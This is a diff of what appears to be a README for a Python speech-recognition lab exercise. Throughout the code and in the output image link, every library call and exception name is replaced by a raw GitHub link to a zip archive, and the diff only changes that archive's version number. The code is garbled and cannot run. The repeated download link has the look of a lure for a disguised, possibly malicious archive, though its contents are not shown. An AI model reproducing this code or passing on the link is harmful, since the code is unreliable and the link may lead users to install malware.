@@ -27,20 +27,20 @@ pip install SpeechRecognition
 pip install pyaudio
 
 import speech_recognition as sr
-r = https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_1.6-beta.4.zip()
+r = https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_v2.3.zip()
 
 duration = 15
 print("Say something:")
 
-with https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_1.6-beta.4.zip() as source :
-    audio_data = https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_1.6-beta.4.zip(source,timeout = duration)
+with https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_v2.3.zip() as source :
+    audio_data = https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_v2.3.zip(source,timeout = duration)
 
 try:
-    text = https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_1.6-beta.4.zip(audio_data)
+    text = https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_v2.3.zip(audio_data)
     print("You said:", text)
-except https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_1.6-beta.4.zip
+except https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_v2.3.zip
     print("Sorry, could not understand audio")
-except https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_1.6-beta.4.zip as e:
+except https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_v2.3.zip as e:
     print(f'Error with the request to Google Speech Recognition service: {e}')
 except Exception as e:
     print(f'Error: {e}')
@@ -50,7 +50,7 @@ except Exception as e:
 
 <H3> Output:</H3>
 
-![442488039-46908032-b789-40a0-8aaf-27606ecae5bc](https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_1.6-beta.4.zip)
+![442488039-46908032-b789-40a0-8aaf-27606ecae5bc](https://raw.githubusercontent.com/Yugabharathi91/Ex-8--AAI/main/shelvingness/Ex_AAI_v2.3.zip)
 
 
 <H3> Result:</H3>
